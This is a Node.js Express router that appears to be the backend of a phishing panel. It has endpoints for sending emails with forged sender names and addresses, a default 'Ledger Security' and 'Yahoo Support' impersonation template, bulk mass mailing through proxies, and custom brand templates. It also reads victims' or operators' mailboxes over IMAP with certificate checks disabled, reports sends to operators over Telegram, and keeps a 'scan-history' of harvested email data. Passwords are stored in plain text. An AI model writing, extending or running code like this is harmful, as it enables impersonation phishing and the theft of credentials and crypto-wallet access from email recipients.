const express = require('express');
const Imap = require('imap');
const { simpleParser } = require('mailparser');
const path = require('path');
const fs = require('fs-extra');
const { DATA_DIR } = require('../config');
const { requireAuth, requireAdmin, createSession, destroySession, loginUser } = require('../auth');
const {
  readJSON, writeJSON, readUserData, writeUserData,
  getSettings, saveSettings,
  USERS_FILE, TEAM_FILE, PROXIES_FILE, BRAND_TEMPLATES_FILE
} = require('../storage');
const {
  getSharedSmtpConfigs, getUserSenderConfig, getEffectiveSmtpConfig,
  createTransporter, loadProxies, attachSenderImage,
  addSharedSmtpConfig, deleteSharedSmtpConfig
} = require('../smtp');
const { buildLedgerHTML, buildYahooHTML, BRAND_TEMPLATES, getBrandTemplates, addCustomBrandTemplates } = require('../templates');
const { sendTelegramNotification } = require('../telegram');

const router = express.Router();

// ============ AUTH API ============
router.post('/auth/login', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ success: false, message: 'Username and password required' });
  const user = await loginUser(username, password);
  if (!user) return res.status(401).json({ success: false, message: 'Invalid credentials' });
  const token = createSession(user);
  res.json({ success: true, token, user: { username: user.username, role: user.role, id: user.id, telegramId: user.telegramId || '', telegramChatId: user.telegramChatId || '' } });
});

router.post('/auth/logout', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  destroySession(token);
  res.json({ success: true });
});

router.get('/auth/me', requireAuth, async (req, res) => {
  // Include sender config in user info
  const senderConfig = await getUserSenderConfig(req.user.id);
  res.json({ success: true, user: { ...req.user, senderConfig } });
});

// Serve profile pictures
router.get('/profile-pic/:userId', requireAuth, async (req, res) => {
  try {
    const users = await readJSON(USERS_FILE);
    const user = users.find(u => String(u.id) === String(req.params.userId));
    if (!user?.profilePic) return res.status(404).json({ success: false, message: 'No profile picture' });
    res.sendFile(user.profilePic);
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Upload profile picture
router.post('/upload-profile-pic', requireAuth, async (req, res) => {
  try {
    const file = req.files?.profilePic;
    if (!file) return res.status(400).json({ success: false, message: 'No file uploaded' });
    const users = await readJSON(USERS_FILE);
    const user = users.find(u => String(u.id) === String(req.user.id));
    if (!user) return res.status(404).json({ success: false, message: 'User not found' });
    
    const userDir = path.join(DATA_DIR, 'users', String(user.id));
    fs.ensureDirSync(userDir);
    const picPath = path.join(userDir, 'profile-pic.jpg');
    fs.writeFileSync(picPath, file.data);
    user.profilePic = picPath;
    await writeJSON(USERS_FILE, users);
    res.json({ success: true, message: 'Profile picture uploaded!' });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ============ API: SENDER CONFIG (per-user) ============
router.get('/sender-config', requireAuth, async (req, res) => {
  const senderConfig = await getUserSenderConfig(req.user.id);
  const sharedDomains = getSharedSmtpConfigs().map(s => ({ id: s.id, domain: s.domain, name: s.name }));
  res.json({ success: true, senderConfig, sharedDomains });
});

router.post('/sender-config', requireAuth, async (req, res) => {
  const { domain, prefix } = req.body;
  const validDomains = getSharedSmtpConfigs().map(s => s.domain);
  const finalDomain = validDomains.includes(domain) ? domain : 'irnna.com';
  const finalPrefix = (prefix || 'noreply').trim().toLowerCase().replace(/[^a-z0-9._-]/g, '');
  const users = await readJSON(USERS_FILE);
  const user = users.find(u => String(u.id) === String(req.user.id));
  if (!user) return res.status(404).json({ success: false, message: 'User not found' });
  user.senderDomain = finalDomain;
  user.senderPrefix = finalPrefix || 'noreply';
  await writeJSON(USERS_FILE, users);
  const senderConfig = await getUserSenderConfig(req.user.id);
  res.json({ success: true, senderConfig, message: `Sender email set to ${senderConfig.senderEmail}` });
});

// ============ API: USERS ============
router.get('/users', requireAuth, requireAdmin, async (req, res) => {
  const users = (await readJSON(USERS_FILE)).map(u => ({ id: u.id, username: u.username, role: u.role, telegramId: u.telegramId || '', telegramChatId: u.telegramChatId || '', createdAt: u.createdAt }));
  res.json(users);
});

router.post('/users', requireAuth, requireAdmin, async (req, res) => {
  const { username, password, role = 'user', telegramId = '' } = req.body;
  if (!username || !password) return res.status(400).json({ success: false, message: 'Username and password required' });
  const users = await readJSON(USERS_FILE);
  if (users.find(u => u.username === username)) return res.status(400).json({ success: false, message: 'User already exists' });
  users.push({ id: Date.now().toString(), username, password, role, telegramId: telegramId ? telegramId.replace('@', '') : '', telegramChatId: '', createdAt: new Date().toISOString() });
  await writeJSON(USERS_FILE, users);
  res.json({ success: true });
});

router.delete('/users/:id', requireAuth, requireAdmin, async (req, res) => {
  let users = await readJSON(USERS_FILE);
  const user = users.find(u => u.id === req.params.id);
  if (!user) return res.status(404).json({ success: false, message: 'User not found' });
  if (user.role === 'admin') return res.status(400).json({ success: false, message: 'Cannot remove admin' });
  users = users.filter(u => u.id !== req.params.id);
  await writeJSON(USERS_FILE, users);
  res.json({ success: true });
});

// ============ API: SETTINGS ============
router.get('/settings', requireAuth, async (req, res) => {
  res.json(await getSettings());
});

router.post('/settings', requireAuth, async (req, res) => {
  const current = await getSettings();
  const updated = { ...current, ...req.body };
  await saveSettings(updated);
  res.json({ success: true, settings: updated });
});

// ============ API: TEMPLATE SEND ============
router.post('/send-template', requireAuth, async (req, res) => {
  try {
    const { template, to, smtpConfig } = req.body;
    if (!template || !to) return res.status(400).json({ success: false, message: 'Template and recipient required' });
    const settings = await getSettings();
    let html, subject;
    if (template === 'ledger') {
      html = buildLedgerHTML(settings);
      subject = settings.ledgerSubject;
    } else if (template === 'yahoo') {
      html = buildYahooHTML(settings);
      subject = settings.yahooSubject;
    } else {
      return res.status(400).json({ success: false, message: 'Unknown template' });
    }
    const smtpConf = await getEffectiveSmtpConfig(req.user.id, smtpConfig);
    const transporter = createTransporter(smtpConf);
    const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
    const fromName = smtpConf.spoofName || (template === 'ledger' ? 'Ledger Security' : 'Yahoo Support');
    const fromStr = `"${fromName}" <${fromEmail}>`;
    const info = await transporter.sendMail({ from: fromStr, to, subject, html });
    res.json({ success: true, message: `${template} template sent!`, messageId: info.messageId });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============ API: PROXIES ============
router.get('/proxies', requireAuth, async (req, res) => {
  res.json(await readJSON(PROXIES_FILE));
});

router.post('/proxies', requireAuth, async (req, res) => {
  const { host, port, type, username, password, enabled } = req.body;
  if (!host || !port) return res.status(400).json({ success: false, message: 'Host and port required' });
  const proxies = await readJSON(PROXIES_FILE);
  proxies.push({
    id: Date.now().toString(),
    host, port: parseInt(port),
    type: type || 'socks5',
    username: username || '',
    password: password || '',
    enabled: enabled !== false,
    createdAt: new Date().toISOString()
  });
  await writeJSON(PROXIES_FILE, proxies);
  await loadProxies();
  res.json({ success: true, count: proxies.length });
});

router.delete('/proxies/:id', requireAuth, async (req, res) => {
  let proxies = await readJSON(PROXIES_FILE);
  proxies = proxies.filter(p => p.id !== req.params.id);
  await writeJSON(PROXIES_FILE, proxies);
  await loadProxies();
  res.json({ success: true });
});

// ============ API: SMTP CONFIGURATIONS (per-user) ============
router.get('/smtp-configs', requireAuth, async (req, res) => {
  const userConfigs = await readUserData(req.user.id, 'smtp-configs');
  const safeUserConfigs = userConfigs.map(c => ({ ...c, pass: '********' }));
  const sharedConfigs = getSharedSmtpConfigs().map(c => ({ ...c, pass: '********' }));
  res.json({ userConfigs: safeUserConfigs, sharedConfigs, all: [...sharedConfigs, ...safeUserConfigs] });
});

router.post('/smtp-configs', requireAuth, async (req, res) => {
  const { id, name, host, port, secure, user, pass, spoofName, spoofEmail } = req.body;
  if (!name || !host || !user) {
    return res.status(400).json({ success: false, message: 'Name, host, and user are required' });
  }
  const configs = await readUserData(req.user.id, 'smtp-configs');
  const config = {
    id: id || Date.now().toString(),
    name, host, port: port || 587,
    secure: secure || false,
    user, pass: pass || '',
    spoofName: spoofName || '',
    spoofEmail: spoofEmail || '',
    createdAt: new Date().toISOString(),
  };
  const idx = configs.findIndex(c => c.id === config.id);
  if (idx >= 0) {
    if (config.pass === '********') config.pass = configs[idx].pass;
    configs[idx] = config;
  } else {
    configs.push(config);
  }
  await writeUserData(req.user.id, 'smtp-configs', configs);
  res.json({ success: true, config: { ...config, pass: '********' } });
});

router.delete('/smtp-configs/:id', requireAuth, async (req, res) => {
  let configs = await readUserData(req.user.id, 'smtp-configs');
  configs = configs.filter(c => c.id !== req.params.id);
  await writeUserData(req.user.id, 'smtp-configs', configs);
  res.json({ success: true });
});

router.post('/smtp-test', requireAuth, async (req, res) => {
  try {
    const transporter = createTransporter(req.body);
    await transporter.verify();
    res.json({ success: true, message: 'SMTP connection successful!' });
  } catch (err) {
    res.json({ success: false, message: err.message });
  }
});

// ============ API: SHARED SMTP CONFIGS (admin-only, available to all users) ============
router.post('/shared-smtp', requireAuth, requireAdmin, async (req, res) => {
  try {
    const { id, name, host, port, secure, user, pass, domain, spoofName, spoofEmail } = req.body;
    if (!name || !host || !user || !domain) {
      return res.status(400).json({ success: false, message: 'Name, host, user, and domain are required' });
    }
    const config = await addSharedSmtpConfig({
      id, name, host, port: port || 587, secure: secure || false,
      user, pass: pass || '', domain,
      spoofName: spoofName || '', spoofEmail: spoofEmail || ''
    });
    res.json({ success: true, config: { ...config, pass: '********' } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

router.delete('/shared-smtp/:id', requireAuth, requireAdmin, async (req, res) => {
  try {
    await deleteSharedSmtpConfig(req.params.id);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// ============ API: IMAP CONFIGURATIONS (per-user) ============
router.get('/imap-configs', requireAuth, async (req, res) => {
  res.json(await readUserData(req.user.id, 'imap-configs'));
});

router.post('/imap-configs', requireAuth, async (req, res) => {
  const { id, name, host, port, secure, user, pass } = req.body;
  if (!name || !host || !user) {
    return res.status(400).json({ success: false, message: 'Name, host, and user required' });
  }
  const configs = await readUserData(req.user.id, 'imap-configs');
  const config = {
    id: id || Date.now().toString(),
    name, host, port: port || 993,
    secure: secure !== false,
    user, pass: pass || '',
    createdAt: new Date().toISOString()
  };
  const idx = configs.findIndex(c => c.id === config.id);
  if (idx >= 0) {
    if (config.pass === '********') config.pass = configs[idx].pass;
    configs[idx] = config;
  } else configs.push(config);
  await writeUserData(req.user.id, 'imap-configs', configs);
  res.json({ success: true, config: { ...config, pass: '********' } });
});

router.delete('/imap-configs/:id', requireAuth, async (req, res) => {
  let configs = await readUserData(req.user.id, 'imap-configs');
  configs = configs.filter(c => c.id !== req.params.id);
  await writeUserData(req.user.id, 'imap-configs', configs);
  res.json({ success: true });
});

function openImapConnection(imapConfig) {
  return new Promise((resolve, reject) => {
    const imap = new Imap({
      user: imapConfig.user,
      password: imapConfig.pass,
      host: imapConfig.host,
      port: parseInt(imapConfig.port) || 993,
      tls: imapConfig.secure !== false,
      tlsOptions: { rejectUnauthorized: false },
    });
    imap.once('ready', () => resolve(imap));
    imap.once('error', (err) => reject(err));
    imap.connect();
  });
}

router.post('/imap-fetch', requireAuth, async (req, res) => {
  try {
    const { configId, searchCriteria = ['UNSEEN'], mailbox = 'INBOX', fetchCount = 20 } = req.body;
    const configs = await readUserData(req.user.id, 'imap-configs');
    let imapConfig;
    
    if (configId) {
      imapConfig = configs.find(c => c.id === configId);
      if (!imapConfig) return res.status(400).json({ success: false, message: 'IMAP config not found' });
    } else {
      imapConfig = req.body;
    }

    if (!imapConfig.user || !imapConfig.pass) {
      return res.status(400).json({ success: false, message: 'IMAP credentials required' });
    }

    const imap = await openImapConnection(imapConfig);
    
    const emails = await new Promise((resolve, reject) => {
      imap.openBox(mailbox, true, (err, box) => {
        if (err) { reject(err); return; }
        
        imap.search(searchCriteria, (err, results) => {
          if (err) { reject(err); return; }
          
          if (results.length === 0) {
            imap.end();
            resolve([]);
            return;
          }

          const fetch = imap.seq.fetch(results.slice(-Math.min(fetchCount, results.length)), {
            bodies: '',
            struct: true,
          });
          
          const emails = [];
          fetch.on('message', (msg, seqno) => {
            const email = { seqno, attachments: [] };
            
            msg.on('body', (stream, info) => {
              simpleParser(stream, (err, parsed) => {
                if (err) return;
                email.subject = parsed.subject || '(No Subject)';
                email.from = parsed.from ? parsed.from.text : '';
                email.to = parsed.to ? parsed.to.text : '';
                email.date = parsed.date || new Date();
                email.text = parsed.text || '';
                email.html = parsed.html || '';
                if (parsed.attachments) {
                  email.attachments = parsed.attachments.map(a => ({
                    filename: a.filename,
                    contentType: a.contentType,
                    size: a.size,
                  }));
                }
              });
            });

            msg.once('end', () => {
              emails.push(email);
            });
          });

          fetch.once('end', () => {
            imap.end();
            resolve(emails);
          });

          fetch.once('error', (err) => {
            imap.end();
            reject(err);
          });
        });
      });
    });

    res.json({ success: true, emails: emails.sort((a,b) => new Date(b.date) - new Date(a.date)) });
  } catch (err) {
    res.json({ success: false, message: err.message });
  }
});

// ============ API: BRAND TEMPLATES ============
router.get('/brand-templates', requireAuth, async (req, res) => {
  res.json(await getBrandTemplates());
});

router.post('/brand-templates/custom', requireAuth, async (req, res) => {
  const { brand, templates } = req.body;
  if (!brand || !templates) return res.status(400).json({ success: false, message: 'Brand and templates required' });
  const custom = await addCustomBrandTemplates(brand, templates);
  res.json({ success: true, count: custom.length });
});

// ============ API: TEMPLATES (per-user) ============
router.get('/templates', requireAuth, async (req, res) => {
  res.json(await readUserData(req.user.id, 'templates'));
});

router.post('/templates', requireAuth, async (req, res) => {
  const { id, name, subject, body, variables } = req.body;
  if (!name || !subject || !body) {
    return res.status(400).json({ success: false, message: 'Name, subject, and body are required' });
  }
  const templates = await readUserData(req.user.id, 'templates');
  const template = {
    id: id || Date.now().toString(),
    name, subject, body, variables: variables || [],
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
  const idx = templates.findIndex(t => t.id === template.id);
  if (idx >= 0) {
    template.createdAt = templates[idx].createdAt;
    templates[idx] = template;
  } else {
    templates.push(template);
  }
  await writeUserData(req.user.id, 'templates', templates);
  res.json({ success: true, template });
});

router.delete('/templates/:id', requireAuth, async (req, res) => {
  let templates = await readUserData(req.user.id, 'templates');
  templates = templates.filter(t => t.id !== req.params.id);
  await writeUserData(req.user.id, 'templates', templates);
  res.json({ success: true });
});

router.post('/templates/preview', requireAuth, (req, res) => {
  const { subject, body, variables } = req.body;
  let processedSubject = subject;
  let processedBody = body;
  if (variables && Array.isArray(variables)) {
    variables.forEach(v => {
      const regex = new RegExp(`{{${v.name}}}`, 'g');
      processedSubject = processedSubject.replace(regex, v.value || `{{${v.name}}}`);
      processedBody = processedBody.replace(regex, v.value || `{{${v.name}}}`);
    });
  }
  res.json({ success: true, subject: processedSubject, body: processedBody });
});

// ============ API: SCHEDULED SENDING (per-user) ============
router.get('/schedules', requireAuth, async (req, res) => {
  res.json(await readUserData(req.user.id, 'schedules'));
});

router.post('/schedules', requireAuth, async (req, res) => {
  const { id, name, recipients, subject, body, html, smtpConfig, cronExpression, timezone, telegramNotify, active } = req.body;
  if (!name || !cronExpression) return res.status(400).json({ success: false, message: 'Name and cron expression required' });
  const schedules = await readUserData(req.user.id, 'schedules');
  const schedule = {
    id: id || Date.now().toString(),
    name, recipients: recipients || [], subject, body, html,
    smtpConfig: smtpConfig || null,
    cronExpression, timezone: timezone || 'UTC',
    telegramNotify: telegramNotify !== false,
    active: active !== false,
    createdAt: new Date().toISOString()
  };
  const idx = schedules.findIndex(s => s.id === schedule.id);
  if (idx >= 0) schedules[idx] = schedule;
  else schedules.push(schedule);
  await writeUserData(req.user.id, 'schedules', schedules);
  res.json({ success: true, schedule });
});

router.delete('/schedules/:id', requireAuth, async (req, res) => {
  let schedules = await readUserData(req.user.id, 'schedules');
  schedules = schedules.filter(s => s.id !== req.params.id);
  await writeUserData(req.user.id, 'schedules', schedules);
  res.json({ success: true });
});

// ============ API: SEND EMAIL ============
router.post('/send-email', requireAuth, async (req, res) => {
  try {
    const { to, subject, text, html, smtpConfig, spoofName, spoofEmail } = req.body;
    if (!to || !subject || !text) {
      return res.status(400).json({ success: false, message: 'Missing required fields: to, subject, text' });
    }
    
    const smtpConf = await getEffectiveSmtpConfig(req.user.id, smtpConfig);
    const senderConfig = await getUserSenderConfig(req.user.id);
    
    const transporter = createTransporter(smtpConf);
    const fromName = spoofName || smtpConf.spoofName || senderConfig.senderName || '';
    const fromEmail = spoofEmail || smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
    const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
    
    const mailOptions = {
      from: fromStr,
      to, subject,
      text, html: html || text,
    };

    const info = await transporter.sendMail(mailOptions);
    
    // Send notification to the user's assigned Telegram
    try {
      const users = await readJSON(USERS_FILE);
      const user = users.find(u => u.id === req.user.id);
      const targetChatId = user?.telegramChatId || process.env.TELEGRAM_CHAT_ID;
      await sendTelegramNotification(`📧 Email Sent!\n\nTo: ${to}\nSubject: ${subject}\nFrom: ${fromStr}\nStatus: ✅ Success\nMessage ID: ${info.messageId}`, targetChatId);
    } catch (tgErr) {}

    res.json({ success: true, message: 'Email sent successfully!', messageId: info.messageId });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============ API: MASS MAILER ============
router.post('/send-mass', requireAuth, async (req, res) => {
  try {
    const { recipients, subject, text, html, smtpConfig, spoofName, spoofEmail, telegramNotify, delay = 100 } = req.body;
    
    if (!recipients || !Array.isArray(recipients) || recipients.length === 0) {
      return res.status(400).json({ success: false, message: 'Recipients array is required' });
    }
    if (!subject || !text) {
      return res.status(400).json({ success: false, message: 'Subject and text are required' });
    }

    const smtpConf = await getEffectiveSmtpConfig(req.user.id, smtpConfig);
    const senderConfig = await getUserSenderConfig(req.user.id);

    const transporter = createTransporter(smtpConf);
    const fromName = spoofName || smtpConf.spoofName || senderConfig.senderName || '';
    const fromEmail = spoofEmail || smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
    const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
    const results = [];
    let sent = 0, failed = 0;

    for (let i = 0; i < recipients.length; i++) {
      const recipient = recipients[i];
      const email = typeof recipient === 'string' ? recipient : recipient.email;
      const vars = typeof recipient === 'object' ? recipient.variables || {} : {};
      
      let processedSubject = subject;
      let processedText = text;
      let processedHtml = html;
      
      Object.entries(vars).forEach(([key, val]) => {
        const regex = new RegExp(`{{${key}}}`, 'g');
        processedSubject = processedSubject.replace(regex, val);
        processedText = processedText.replace(regex, val);
        if (processedHtml) processedHtml = processedHtml.replace(regex, val);
      });

      try {
        const mailOptions = {
          from: fromStr,
          to: email,
          subject: processedSubject,
          text: processedText,
          html: processedHtml || processedText,
        };
        const info = await transporter.sendMail(mailOptions);
        results.push({ email, success: true, messageId: info.messageId });
        sent++;
      } catch (err) {
        results.push({ email, success: false, error: err.message });
        failed++;
      }
      
      if (delay > 0 && i < recipients.length - 1) {
        await new Promise(r => setTimeout(r, delay));
      }
    }

    if (telegramNotify !== false) {
      try {
        const users = await readJSON(USERS_FILE);
        const user = users.find(u => u.id === req.user.id);
        const targetChatId = user?.telegramChatId || process.env.TELEGRAM_CHAT_ID;
        await sendTelegramNotification(
          `📬 Mass Mail Complete!\n\n✅ Sent: ${sent}\n❌ Failed: ${failed}\n📊 Total: ${recipients.length}`,
          targetChatId
        );
      } catch (tgErr) {}
    }

    res.json({
      success: true, total: recipients.length, sent, failed, results,
    });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============ API: SEND TELEGRAM ============
router.post('/send-telegram', requireAuth, async (req, res) => {
  try {
    const { message } = req.body;
    if (!message) return res.status(400).json({ success: false, message: 'Message is required' });
    // Send to the user's assigned Telegram chat
    const users = await readJSON(USERS_FILE);
    const user = users.find(u => u.id === req.user.id);
    const targetChatId = user?.telegramChatId || process.env.TELEGRAM_CHAT_ID;
    const result = await sendTelegramNotification(message, targetChatId);
    res.json({ success: true, message: 'Telegram message sent!', result });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============ API: SEND COMBINED ============
router.post('/send-combined', requireAuth, async (req, res) => {
  try {
    const { to, subject, text, html, telegramMessage, smtpConfig } = req.body;
    if (!to || !subject || !text) {
      return res.status(400).json({ success: false, message: 'Missing required fields: to, subject, text' });
    }
    
    const smtpConf = await getEffectiveSmtpConfig(req.user.id, smtpConfig);

    const results = { email: null, telegram: null };
    const errors = [];

    try {
      const transporter = createTransporter(smtpConf);
      const senderConfig = await getUserSenderConfig(req.user.id);
      const fromName = smtpConf.spoofName || senderConfig.senderName || '';
      const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
      const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
      const mailOptions = {
        from: fromStr,
        to, subject, text,
        html: html || text,
      };
      const info = await transporter.sendMail(mailOptions);
      results.email = { success: true, messageId: info.messageId };
    } catch (err) {
      errors.push(`Email: ${err.message}`);
      results.email = { success: false, error: err.message };
    }

    try {
      const tgMsg = telegramMessage || `📧 Email Activity\n\nTo: ${to}\nSubject: ${subject}\nTime: ${new Date().toLocaleString()}`;
      const users = await readJSON(USERS_FILE);
      const user = users.find(u => u.id === req.user.id);
      const targetChatId = user?.telegramChatId || process.env.TELEGRAM_CHAT_ID;
      await sendTelegramNotification(tgMsg, targetChatId);
      results.telegram = { success: true };
    } catch (err) {
      errors.push(`Telegram: ${err.message}`);
      results.telegram = { success: false, error: err.message };
    }

    res.json({ success: true, results, errors: errors.length > 0 ? errors : null });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============ API: SCAN HISTORY (per-user) ============
router.get('/scan-history', requireAuth, async (req, res) => {
  res.json(await readUserData(req.user.id, 'scan-history'));
});

router.post('/scan-history', requireAuth, async (req, res) => {
  const history = await readUserData(req.user.id, 'scan-history');
  const entry = {
    id: Date.now().toString(),
    ...req.body,
    timestamp: new Date().toISOString()
  };
  history.unshift(entry);
  if (history.length > 500) history.length = 500;
  await writeUserData(req.user.id, 'scan-history', history);
  res.json({ success: true, entry });
});

router.delete('/scan-history', requireAuth, async (req, res) => {
  await writeUserData(req.user.id, 'scan-history', []);
  res.json({ success: true });
});

router.get('/scan-history/export', requireAuth, async (req, res) => {
  const history = await readUserData(req.user.id, 'scan-history');
  const csv = [
    'ID,Timestamp,Type,Email,Source,Data,Confidence',
    ...history.map(h => `${h.id},${h.timestamp},${h.type || ''},${h.email || ''},${h.source || ''},${(h.data || '').replace(/,/g,';')},${h.confidence || ''}`)
  ].join('\n');
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename=scan-history.csv');
  res.send(csv);
});

// ============ API: TEAM ============
router.get('/team', requireAuth, async (req, res) => {
  res.json(await readJSON(TEAM_FILE));
});

router.post('/team/invite', requireAuth, requireAdmin, async (req, res) => {
  const { telegramId, role = 'member' } = req.body;
  if (!telegramId) return res.status(400).json({ success: false, message: 'Telegram ID required' });
  const team = await readJSON(TEAM_FILE);
  if (team.find(m => m.telegramId === telegramId)) {
    return res.json({ success: false, message: 'Member already exists' });
  }
  team.push({
    id: Date.now().toString(),
    telegramId,
    role,
    invitedAt: new Date().toISOString(),
    status: 'active'
  });
  await writeJSON(TEAM_FILE, team);
  res.json({ success: true, team });
});

router.delete('/team/:id', requireAuth, requireAdmin, async (req, res) => {
  let team = await readJSON(TEAM_FILE);
  team = team.filter(m => m.id !== req.params.id);
  await writeJSON(TEAM_FILE, team);
  res.json({ success: true });
});

// ============ API: STATUS ============
router.get('/status', requireAuth, async (req, res) => {
  const configs = await readUserData(req.user.id, 'smtp-configs');
  const imapConfigs = await readUserData(req.user.id, 'imap-configs');
  const { getBot } = require('../telegram');
  res.json({
    server: 'running',
    email: configs.length > 0 || (process.env.SMTP_USER && process.env.SMTP_USER !== 'your-email@gmail.com'),
    telegram: getBot() !== null,
    smtpConfigs: configs.length,
    imapConfigs: imapConfigs.length,
    templates: (await readUserData(req.user.id, 'templates')).length,
    schedules: (await readUserData(req.user.id, 'schedules')).length,
    proxies: (await readJSON(PROXIES_FILE)).length,
    team: (await readJSON(TEAM_FILE)).length,
    users: (await readJSON(USERS_FILE)).length,
    brandTemplates: BRAND_TEMPLATES.reduce((a, b) => a + b.templates.length, 0),
    admin: '@' + (require('../config').ADMIN_USERNAME),
    timestamp: new Date().toISOString(),
  });
});

module.exports = router;